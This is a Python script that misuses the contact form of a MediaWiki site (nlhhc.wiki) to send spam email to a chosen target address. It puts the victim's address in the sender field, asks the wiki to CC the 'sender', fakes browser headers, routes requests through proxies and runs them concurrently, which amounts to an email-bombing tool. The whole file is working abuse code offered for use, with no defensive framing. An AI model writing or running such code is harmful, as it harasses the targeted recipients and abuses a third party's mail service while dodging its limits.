from os.path import basename

import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        import requests

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Origin': 'https://nlhhc.wiki',
            'Pragma': 'no-cache',
            'Referer': 'https://nlhhc.wiki/wiki/Special:Contact',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        data = {
            'wpFromName': 'test',
            'wpFromAddress': target,
            'wpSubject': self.get_text(),
            'wpText': self.get_text(),
            'wpCCme': '1',
            'wpEditToken': '+\\',
            'title': 'Special:Contact',
            'wpFormType': '',
        }

        response = requests.post('https://nlhhc.wiki/wiki/Special:Contact', headers=headers, data=data,
                                 proxies=self.get_proxies(), timeout=20)
        return response


def main():
    s = 'Your email message has been sent.'
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
